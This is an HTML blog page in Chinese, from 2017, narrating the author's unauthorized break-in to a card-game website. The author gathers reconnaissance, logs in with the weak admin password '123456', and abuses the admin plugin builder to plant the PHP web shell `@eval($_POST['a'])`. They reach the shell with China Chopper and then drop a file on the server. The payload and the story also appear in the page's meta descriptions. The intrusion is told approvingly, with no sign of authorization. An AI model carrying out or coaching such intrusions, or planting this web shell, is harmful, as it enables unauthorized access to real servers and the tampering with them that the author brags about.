@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='起因 十月一回家和表弟还有他女票在一起玩的时候(当然，还有我女票也一起，别问我女票哪来的)，四个人刚好可以凑一桌麻将，表弟的女朋友说叫我们一起打黑桃4，黑桃4是我们家乡的一种打法。。。。 然后发了我一个app，我安装以后打开一看。 卧槽，XXXX四个大字出现在我眼前 不过此时心思并不在游戏上，这个叫XXXX的肯定有个官网吧。(事情到此结束，十月一回家电脑没带回去&amp;hellip;..) 祖国的生日结束以后&amp;hellip;..又回到了学校，打开百度搜了下这个xxxx，找到了他官网: http://xxxx.com/。 踩点 简单的搜集了下信息如下: IP: XXX.XXX.XX.XX 旁站:无 cdn:无 脚本:php 中间件:nginx 框架:ThinkPHP cms:vlcms 可以判断出服务器架构是:php&#43;mysql&#43;nginx&#43;linux 进后台 说到这个后台嘛&amp;hellip;&amp;hellip;.很蛋疼，想说点啥，太丢人了，还是不说了吧！！！（知道了cms，先百度网上公开的漏洞，这里毛都没有&amp;hellip;&amp;hellip;） 在url后面加上admin.php，会跳转到登录界面 测试了下弱口令(人品爆发) admin admin 失败 admin 123456 成功 Getshell 老规矩，知道cms先百度，一样，毛都没&amp;hellip;&amp;hellip; 只能硬着头皮在后台翻了&amp;hellip;.. 这里admin用户权限已经是属于超级管理员了，权限是最高的了。 还有个数据库备份和用户配置 不过数据库是mysql的&amp;hellip;..没屌用啊，此处感慨为啥不学学南方。 剩下的就是上传点了 上传点有点多，随便找了个上传点 先上传张正常的图片看下上传功能是否有用 看来是能正常上传的，然后直接上传php脚本，弹了个框框（以为是js验证，禁用js后还是没用） 然后各种上传绕过都试了，也是没用。 高潮 看来上传这条路是死了，翻了翻超级管理员的访问授权，看下还有哪些功能 扩展管理？后台并没有找到这个地方，莫非是阉割版？？？（后来土豆找到了这个地方） 修改url为http://xxxx.com/admin.php?s=/Addons/index，然后访问 和土豆研究了下这个插件，先点击快速创建 点击预览按钮可以看到代码。。。。。 竟然能看到代码？这不是脱裤子找日吗？ 思路：打算在这里写入一句话。 顺手写了个一句话，然后点击预览发现被注释了。 看来是有用的，那就好办了，闭合下注释和php末端。 最后的代码是**/?&amp;gt; &lt;?php @eval($_POST[&#34;a&#34;]);?&gt; &amp;lt;?php /* Ok，这样我们的一句话就写进去了。然后点击确定 卧槽，好激动。。。 可是tm的地址呢？？？不过可以肯定的是，马是写进去了。 然后我又创建了一个插件，这次不打算完整闭合代码。 这样肯定是出错的，然后我们点击确定 没错，正如你所见，报错了。刚才创建的名叫test1。 然后构造下我们之前创建名为Example的路径 地址为: http://xxxx.com/Addons/Example/ExampleAddon.class.php 然后请出菜刀，连接看看 连接成功，成功获取shell。 由于服务器Linux服务器我就不去提权了。 结尾 这种棋牌网站，竟然来了，怎么能不留点东西呢 丢个txt文件走人 '>
+<title>陪妹子玩游戏引起的风波</title>
+
+<link rel='canonical' href='https://360rce.github.io/p/j5i17p4f/'>
+
+<link rel="stylesheet" href="/scss/style.min.efe1e773d779dbe0d478a3345bc5ad949fed81363c53bfa8984135f20bf7841d.css"><meta property='og:title' content='陪妹子玩游戏引起的风波'>
+<meta property='og:description' content='起因 十月一回家和表弟还有他女票在一起玩的时候(当然，还有我女票也一起，别问我女票哪来的)，四个人刚好可以凑一桌麻将，表弟的女朋友说叫我们一起打黑桃4，黑桃4是我们家乡的一种打法。。。。 然后发了我一个app，我安装以后打开一看。 卧槽，XXXX四个大字出现在我眼前 不过此时心思并不在游戏上，这个叫XXXX的肯定有个官网吧。(事情到此结束，十月一回家电脑没带回去&amp;hellip;..) 祖国的生日结束以后&amp;hellip;..又回到了学校，打开百度搜了下这个xxxx，找到了他官网: http://xxxx.com/。 踩点 简单的搜集了下信息如下: IP: XXX.XXX.XX.XX 旁站:无 cdn:无 脚本:php 中间件:nginx 框架:ThinkPHP cms:vlcms 可以判断出服务器架构是:php&#43;mysql&#43;nginx&#43;linux 进后台 说到这个后台嘛&amp;hellip;&amp;hellip;.很蛋疼，想说点啥，太丢人了，还是不说了吧！！！（知道了cms，先百度网上公开的漏洞，这里毛都没有&amp;hellip;&amp;hellip;） 在url后面加上admin.php，会跳转到登录界面 测试了下弱口令(人品爆发) admin admin 失败 admin 123456 成功 Getshell 老规矩，知道cms先百度，一样，毛都没&amp;hellip;&amp;hellip; 只能硬着头皮在后台翻了&amp;hellip;.. 这里admin用户权限已经是属于超级管理员了，权限是最高的了。 还有个数据库备份和用户配置 不过数据库是mysql的&amp;hellip;..没屌用啊，此处感慨为啥不学学南方。 剩下的就是上传点了 上传点有点多，随便找了个上传点 先上传张正常的图片看下上传功能是否有用 看来是能正常上传的，然后直接上传php脚本，弹了个框框（以为是js验证，禁用js后还是没用） 然后各种上传绕过都试了，也是没用。 高潮 看来上传这条路是死了，翻了翻超级管理员的访问授权，看下还有哪些功能 扩展管理？后台并没有找到这个地方，莫非是阉割版？？？（后来土豆找到了这个地方） 修改url为http://xxxx.com/admin.php?s=/Addons/index，然后访问 和土豆研究了下这个插件，先点击快速创建 点击预览按钮可以看到代码。。。。。 竟然能看到代码？这不是脱裤子找日吗？ 思路：打算在这里写入一句话。 顺手写了个一句话，然后点击预览发现被注释了。 看来是有用的，那就好办了，闭合下注释和php末端。 最后的代码是**/?&amp;gt; &lt;?php @eval($_POST[&#34;a&#34;]);?&gt; &amp;lt;?php /* Ok，这样我们的一句话就写进去了。然后点击确定 卧槽，好激动。。。 可是tm的地址呢？？？不过可以肯定的是，马是写进去了。 然后我又创建了一个插件，这次不打算完整闭合代码。 这样肯定是出错的，然后我们点击确定 没错，正如你所见，报错了。刚才创建的名叫test1。 然后构造下我们之前创建名为Example的路径 地址为: http://xxxx.com/Addons/Example/ExampleAddon.class.php 然后请出菜刀，连接看看 连接成功，成功获取shell。 由于服务器Linux服务器我就不去提权了。 结尾 这种棋牌网站，竟然来了，怎么能不留点东西呢 丢个txt文件走人 '>
+<meta property='og:url' content='https://360rce.github.io/p/j5i17p4f/'>
+<meta property='og:site_name' content='iceH&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='渗透实战' /><meta property='article:tag' content='原创文章' /><meta property='article:published_time' content='2017-10-17T14:17:06&#43;00:00'/><meta property='article:modified_time' content='2017-10-17T14:17:06&#43;00:00'/><meta property='og:image' content='https://w.wallhaven.cc/full/we/wallhaven-wex6pr.png' />
+<meta name="twitter:title" content="陪妹子玩游戏引起的风波">
+<meta name="twitter:description" content="起因 十月一回家和表弟还有他女票在一起玩的时候(当然，还有我女票也一起，别问我女票哪来的)，四个人刚好可以凑一桌麻将，表弟的女朋友说叫我们一起打黑桃4，黑桃4是我们家乡的一种打法。。。。 然后发了我一个app，我安装以后打开一看。 卧槽，XXXX四个大字出现在我眼前 不过此时心思并不在游戏上，这个叫XXXX的肯定有个官网吧。(事情到此结束，十月一回家电脑没带回去&amp;hellip;..) 祖国的生日结束以后&amp;hellip;..又回到了学校，打开百度搜了下这个xxxx，找到了他官网: http://xxxx.com/。 踩点 简单的搜集了下信息如下: IP: XXX.XXX.XX.XX 旁站:无 cdn:无 脚本:php 中间件:nginx 框架:ThinkPHP cms:vlcms 可以判断出服务器架构是:php&#43;mysql&#43;nginx&#43;linux 进后台 说到这个后台嘛&amp;hellip;&amp;hellip;.很蛋疼，想说点啥，太丢人了，还是不说了吧！！！（知道了cms，先百度网上公开的漏洞，这里毛都没有&amp;hellip;&amp;hellip;） 在url后面加上admin.php，会跳转到登录界面 测试了下弱口令(人品爆发) admin admin 失败 admin 123456 成功 Getshell 老规矩，知道cms先百度，一样，毛都没&amp;hellip;&amp;hellip; 只能硬着头皮在后台翻了&amp;hellip;.. 这里admin用户权限已经是属于超级管理员了，权限是最高的了。 还有个数据库备份和用户配置 不过数据库是mysql的&amp;hellip;..没屌用啊，此处感慨为啥不学学南方。 剩下的就是上传点了 上传点有点多，随便找了个上传点 先上传张正常的图片看下上传功能是否有用 看来是能正常上传的，然后直接上传php脚本，弹了个框框（以为是js验证，禁用js后还是没用） 然后各种上传绕过都试了，也是没用。 高潮 看来上传这条路是死了，翻了翻超级管理员的访问授权，看下还有哪些功能 扩展管理？后台并没有找到这个地方，莫非是阉割版？？？（后来土豆找到了这个地方） 修改url为http://xxxx.com/admin.php?s=/Addons/index，然后访问 和土豆研究了下这个插件，先点击快速创建 点击预览按钮可以看到代码。。。。。 竟然能看到代码？这不是脱裤子找日吗？ 思路：打算在这里写入一句话。 顺手写了个一句话，然后点击预览发现被注释了。 看来是有用的，那就好办了，闭合下注释和php末端。 最后的代码是**/?&amp;gt; &lt;?php @eval($_POST[&#34;a&#34;]);?&gt; &amp;lt;?php /* Ok，这样我们的一句话就写进去了。然后点击确定 卧槽，好激动。。。 可是tm的地址呢？？？不过可以肯定的是，马是写进去了。 然后我又创建了一个插件，这次不打算完整闭合代码。 这样肯定是出错的，然后我们点击确定 没错，正如你所见，报错了。刚才创建的名叫test1。 然后构造下我们之前创建名为Example的路径 地址为: http://xxxx.com/Addons/Example/ExampleAddon.class.php 然后请出菜刀，连接看看 连接成功，成功获取shell。 由于服务器Linux服务器我就不去提权了。 结尾 这种棋牌网站，竟然来了，怎么能不留点东西呢 丢个txt文件走人 "><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://w.wallhaven.cc/full/we/wallhaven-wex6pr.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+<style>
+    :root {
+     
+    --sys-font-family: "HarmonyOS_Sans_SC_Medium", Georgia, -apple-system, 'Nimbus Roman No9 L', 'PingFang SC', 'Hiragino Sans GB', 'Noto Serif SC', 'Microsoft Yahei', 'WenQuanYi Micro Hei', 'ST Heiti', sans-serif;
+    --code-font-family: "JetBrainsMono Regular", Menlo, Monaco, Consolas, "Courier New";
+    --article-font-family: "HarmonyOS_Sans_SC_Medium", var(--base-font-family);
+  }
+</style>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://npm.elemecdn.com/irithys-cdn@1.0.4/font/font.css";
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+         document.head.appendChild(customFont);
+}());
+</script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended">
+
+
+        <div id="article-toolbar" style="position: sticky;top: 5px;z-index: 1000;">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M512 256C512 397.4 397.4 512 256 512C114.6 512 0 397.4 0 256C0 114.6 114.6 0 256 0C397.4 0 512 114.6 512 256zM176 168V344C176 352.7 180.7 360.7 188.3 364.9C195.8 369.2 205.1 369 212.5 364.5L356.5 276.5C363.6 272.1 368 264.4 368 256C368 247.6 363.6 239.9 356.5 235.5L212.5 147.5C205.1 142.1 195.8 142.8 188.3 147.1C180.7 151.3 176 159.3 176 168V168z"></path></svg>
+            
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#起因">起因</a></li>
+        <li><a href="#踩点">踩点</a></li>
+        <li><a href="#进后台">进后台</a></li>
+        <li><a href="#getshell">Getshell</a></li>
+        <li><a href="#高潮">高潮</a></li>
+        <li><a href="#结尾">结尾</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/j5i17p4f/">
+                
+                    <img src="https://w.wallhaven.cc/full/we/wallhaven-wex6pr.png" loading="lazy" alt="Featured image of post 陪妹子玩游戏引起的风波" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%8D%97%E9%A3%8E%E7%9F%A5%E6%88%91%E6%84%8F/" >
+                南风知我意
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/j5i17p4f/">陪妹子玩游戏引起的风波</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M326.1 160l127.4-127.4C451.7 32.39 449.9 32 448 32h-86.06l-128 128H326.1zM166.1 160l128-128H201.9l-128 128H166.1zM497.7 56.19L393.9 160H512V96C512 80.87 506.5 67.15 497.7 56.19zM134.1 32H64C28.65 32 0 60.65 0 96v64h6.062L134.1 32zM0 416c0 35.35 28.65 64 64 64h384c35.35 0 64-28.65 64-64V192H0V416z"></path></svg>
+                
+                <time class="article-time--published">2017/10/17</time>
+            </div>
+        
+
+        
+            <div>
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M256 512C114.6 512 0 397.4 0 256S114.6 0 256 0S512 114.6 512 256s-114.6 256-256 256zM232 120V256c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2V120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"></path></svg>
+                
+                <time class="article-time--reading">
+                    阅读时长: 1 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h3 id="起因">起因</h3>
+<p>十月一回家和表弟还有他女票在一起玩的时候(当然，还有我女票也一起，别问我女票哪来的)，四个人刚好可以凑一桌麻将，表弟的女朋友说叫我们一起打黑桃4，黑桃4是我们家乡的一种打法。。。。
+然后发了我一个app，我安装以后打开一看。
+<img src="/p/j5i17p4f/01.png"
+	width="1268"
+	height="714"
+	srcset="/p/j5i17p4f/01_hu33ccfc55fb44aecd6010c58a5ddef336_997155_480x0_resize_box_3.png 480w, /p/j5i17p4f/01_hu33ccfc55fb44aecd6010c58a5ddef336_997155_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="426px"
+	
+>
+卧槽，XXXX四个大字出现在我眼前
+不过此时心思并不在游戏上，这个叫XXXX的肯定有个官网吧。(事情到此结束，十月一回家电脑没带回去&hellip;..)
+祖国的生日结束以后&hellip;..又回到了学校，打开百度搜了下这个xxxx，找到了他官网: <a class="link" href="http://xxxx.com/"  target="_blank" rel="noopener"
+    >http://xxxx.com/</a>。</p>
+<h3 id="踩点">踩点</h3>
+<p>简单的搜集了下信息如下:
+IP: XXX.XXX.XX.XX
+旁站:无
+cdn:无
+脚本:php
+中间件:nginx
+框架:ThinkPHP
+cms:vlcms</p>
+<p>可以判断出服务器架构是:php+mysql+nginx+linux</p>
+<h3 id="进后台">进后台</h3>
+<p>说到这个后台嘛&hellip;&hellip;.很蛋疼，想说点啥，太丢人了，还是不说了吧！！！（知道了cms，先百度网上公开的漏洞，这里毛都没有&hellip;&hellip;）
+在url后面加上admin.php，会跳转到登录界面
+<img src="/p/j5i17p4f/02.png"
+	width="1211"
+	height="972"
+	srcset="/p/j5i17p4f/02_hu2e85f49795f77d0c95e9fbecb95d36ab_845247_480x0_resize_box_3.png 480w, /p/j5i17p4f/02_hu2e85f49795f77d0c95e9fbecb95d36ab_845247_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="124"
+		data-flex-basis="299px"
+	
+>
+测试了下弱口令(人品爆发)
+admin   admin    失败
+admin   123456   成功
+<img src="/p/j5i17p4f/03.png"
+	width="1920"
+	height="1030"
+	srcset="/p/j5i17p4f/03_hu932d7911415ae9794beb803676899770_209874_480x0_resize_box_3.png 480w, /p/j5i17p4f/03_hu932d7911415ae9794beb803676899770_209874_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
+	
+></p>
+<h3 id="getshell">Getshell</h3>
+<p>老规矩，知道cms先百度，一样，毛都没&hellip;&hellip;
+只能硬着头皮在后台翻了&hellip;..
+这里admin用户权限已经是属于超级管理员了，权限是最高的了。
+还有个数据库备份和用户配置
+<img src="/p/j5i17p4f/04.png"
+	width="201"
+	height="141"
+	srcset="/p/j5i17p4f/04_hu21ce62ed56200ca991859e186ea28495_2122_480x0_resize_box_3.png 480w, /p/j5i17p4f/04_hu21ce62ed56200ca991859e186ea28495_2122_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="142"
+		data-flex-basis="342px"
+	
+>
+不过数据库是mysql的&hellip;..没屌用啊，此处感慨为啥不学学南方。
+剩下的就是上传点了
+上传点有点多，随便找了个上传点
+<img src="/p/j5i17p4f/05.png"
+	width="463"
+	height="204"
+	srcset="/p/j5i17p4f/05_huf63ae0a313df6fe4bed843dbab9b1bf4_8112_480x0_resize_box_3.png 480w, /p/j5i17p4f/05_huf63ae0a313df6fe4bed843dbab9b1bf4_8112_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="226"
+		data-flex-basis="544px"
+	
+>
+<img src="/p/j5i17p4f/06.png"
+	width="382"
+	height="169"
+	srcset="/p/j5i17p4f/06_hued952104262e5f3ceafa063dec320ae8_3480_480x0_resize_box_3.png 480w, /p/j5i17p4f/06_hued952104262e5f3ceafa063dec320ae8_3480_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="226"
+		data-flex-basis="542px"
+	
+>
+先上传张正常的图片看下上传功能是否有用
+<img src="/p/j5i17p4f/07.png"
+	width="417"
+	height="201"
+	srcset="/p/j5i17p4f/07_hueb2b645b3f536567d5e7bb7d4dba2989_23945_480x0_resize_box_3.png 480w, /p/j5i17p4f/07_hueb2b645b3f536567d5e7bb7d4dba2989_23945_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="207"
+		data-flex-basis="497px"
+	
+>
+看来是能正常上传的，然后直接上传php脚本，弹了个框框（以为是js验证，禁用js后还是没用）
+<img src="/p/j5i17p4f/08.png"
+	width="574"
+	height="185"
+	srcset="/p/j5i17p4f/08_hubd6d62f45a21b6e7750e00fe5ada335e_30245_480x0_resize_box_3.png 480w, /p/j5i17p4f/08_hubd6d62f45a21b6e7750e00fe5ada335e_30245_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="310"
+		data-flex-basis="744px"
+	
+>
+然后各种上传绕过都试了，也是没用。</p>
+<h3 id="高潮">高潮</h3>
+<p>看来上传这条路是死了，翻了翻超级管理员的访问授权，看下还有哪些功能
+<img src="/p/j5i17p4f/09.png"
+	width="1011"
+	height="261"
+	srcset="/p/j5i17p4f/09_hu77f21a76e1ef7caa3857eac82ba6b053_10067_480x0_resize_box_3.png 480w, /p/j5i17p4f/09_hu77f21a76e1ef7caa3857eac82ba6b053_10067_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="387"
+		data-flex-basis="929px"
+	
+>
+扩展管理？后台并没有找到这个地方，莫非是阉割版？？？（后来土豆找到了这个地方）
+<img src="/p/j5i17p4f/10.png"
+	width="1446"
+	height="619"
+	srcset="/p/j5i17p4f/10_hu21d5e16d5d68cdf5f47c3a63c41da556_66390_480x0_resize_box_3.png 480w, /p/j5i17p4f/10_hu21d5e16d5d68cdf5f47c3a63c41da556_66390_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="560px"
+	
+>
+修改url为<a class="link" href="http://xxxx.com/admin.php?s=/Addons/index"  target="_blank" rel="noopener"
+    >http://xxxx.com/admin.php?s=/Addons/index</a>，然后访问
+<img src="/p/j5i17p4f/11.png"
+	width="1270"
+	height="552"
+	srcset="/p/j5i17p4f/11_hu185803944fe7ad4c0ad7a632643e7748_306148_480x0_resize_box_3.png 480w, /p/j5i17p4f/11_hu185803944fe7ad4c0ad7a632643e7748_306148_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="230"
+		data-flex-basis="552px"
+	
+>
+和土豆研究了下这个插件，先点击快速创建
+<img src="/p/j5i17p4f/12.png"
+	width="587"
+	height="731"
+	srcset="/p/j5i17p4f/12_hue55050561a7a5abcff7c030b840a4dee_23574_480x0_resize_box_3.png 480w, /p/j5i17p4f/12_hue55050561a7a5abcff7c030b840a4dee_23574_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="80"
+		data-flex-basis="192px"
+	
+>
+点击预览按钮可以看到代码。。。。。
+<img src="/p/j5i17p4f/13.png"
+	width="930"
+	height="715"
+	srcset="/p/j5i17p4f/13_hua6fa48c638903831839ccceeae876062_175593_480x0_resize_box_3.png 480w, /p/j5i17p4f/13_hua6fa48c638903831839ccceeae876062_175593_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="130"
+		data-flex-basis="312px"
+	
+>
+竟然能看到代码？这不是脱裤子找日吗？
+思路：打算在这里写入一句话。
+<img src="/p/j5i17p4f/14.png"
+	width="958"
+	height="620"
+	srcset="/p/j5i17p4f/14_hue2b591bc2cb43d089949b78377e010c8_162677_480x0_resize_box_3.png 480w, /p/j5i17p4f/14_hue2b591bc2cb43d089949b78377e010c8_162677_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="154"
+		data-flex-basis="370px"
+	
+>
+顺手写了个一句话，然后点击预览发现被注释了。
+<img src="/p/j5i17p4f/15.png"
+	width="1088"
+	height="625"
+	srcset="/p/j5i17p4f/15_hub02767e3b1e819d70099fca25a546d42_167458_480x0_resize_box_3.png 480w, /p/j5i17p4f/15_hub02767e3b1e819d70099fca25a546d42_167458_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="174"
+		data-flex-basis="417px"
+	
+>
+看来是有用的，那就好办了，闭合下注释和php末端。
+最后的代码是**/?&gt; <?php @eval($_POST["a"]);?> &lt;?php /*
+<img src="/p/j5i17p4f/16.png"
+	width="1339"
+	height="736"
+	srcset="/p/j5i17p4f/16_huf3131075486804d0bb161fbaf893bd42_206258_480x0_resize_box_3.png 480w, /p/j5i17p4f/16_huf3131075486804d0bb161fbaf893bd42_206258_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="181"
+		data-flex-basis="436px"
+	
+>
+Ok，这样我们的一句话就写进去了。然后点击确定
+<img src="/p/j5i17p4f/17.png"
+	width="349"
+	height="100"
+	srcset="/p/j5i17p4f/17_hu889d0c449488815c15420379c223825d_9759_480x0_resize_box_3.png 480w, /p/j5i17p4f/17_hu889d0c449488815c15420379c223825d_9759_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="349"
+		data-flex-basis="837px"
+	
+>
+卧槽，好激动。。。
+<img src="/p/j5i17p4f/18.png"
+	width="1656"
+	height="565"
+	srcset="/p/j5i17p4f/18_hu493d63d17f25131aa0b0bd464aadd81d_59344_480x0_resize_box_3.png 480w, /p/j5i17p4f/18_hu493d63d17f25131aa0b0bd464aadd81d_59344_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="293"
+		data-flex-basis="703px"
+	
+>
+可是tm的地址呢？？？不过可以肯定的是，马是写进去了。
+然后我又创建了一个插件，这次不打算完整闭合代码。
+<img src="/p/j5i17p4f/19.png"
+	width="1140"
+	height="690"
+	srcset="/p/j5i17p4f/19_huef8a816ab1018827328199f0926712c8_182746_480x0_resize_box_3.png 480w, /p/j5i17p4f/19_huef8a816ab1018827328199f0926712c8_182746_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="165"
+		data-flex-basis="396px"
+	
+>
+这样肯定是出错的，然后我们点击确定
+<img src="/p/j5i17p4f/20.png"
+	width="1001"
+	height="537"
+	srcset="/p/j5i17p4f/20_hu76afcf044a3591db8815f00bb5bc5b70_153695_480x0_resize_box_3.png 480w, /p/j5i17p4f/20_hu76afcf044a3591db8815f00bb5bc5b70_153695_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
+	
+>
+没错，正如你所见，报错了。刚才创建的名叫test1。
+然后构造下我们之前创建名为Example的路径
+地址为: <a class="link" href="http://xxxx.com/Addons/Example/ExampleAddon.class.php"  target="_blank" rel="noopener"
+    >http://xxxx.com/Addons/Example/ExampleAddon.class.php</a>
+然后请出菜刀，连接看看
+<img src="/p/j5i17p4f/21.png"
+	width="1300"
+	height="580"
+	srcset="/p/j5i17p4f/21_hu89ea9a811bd864ba8319ce49581d4eda_61908_480x0_resize_box_3.png 480w, /p/j5i17p4f/21_hu89ea9a811bd864ba8319ce49581d4eda_61908_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="224"
+		data-flex-basis="537px"
+	
+>
+连接成功，成功获取shell。
+由于服务器Linux服务器我就不去提权了。</p>
+<h3 id="结尾">结尾</h3>
+<p>这种棋牌网站，竟然来了，怎么能不留点东西呢
+丢个txt文件走人
+<img src="/p/j5i17p4f/22.png"
+	width="1300"
+	height="580"
+	srcset="/p/j5i17p4f/22_hu12b10283565fd381ea927d48737d6cf0_116942_480x0_resize_box_3.png 480w, /p/j5i17p4f/22_hu12b10283565fd381ea927d48737d6cf0_116942_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="224"
+		data-flex-basis="537px"
+	
+>
+<img src="/p/j5i17p4f/23.png"
+	width="443"
+	height="290"
+	srcset="/p/j5i17p4f/23_hu934b19f575a8378c9c4bea5530df4c96_12387_480x0_resize_box_3.png 480w, /p/j5i17p4f/23_hu934b19f575a8378c9c4bea5530df4c96_12387_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="陪妹子玩游戏引起的风波"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="152"
+		data-flex-basis="366px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/">渗透实战</a>
+        
+            <a href="/tags/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/">原创文章</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
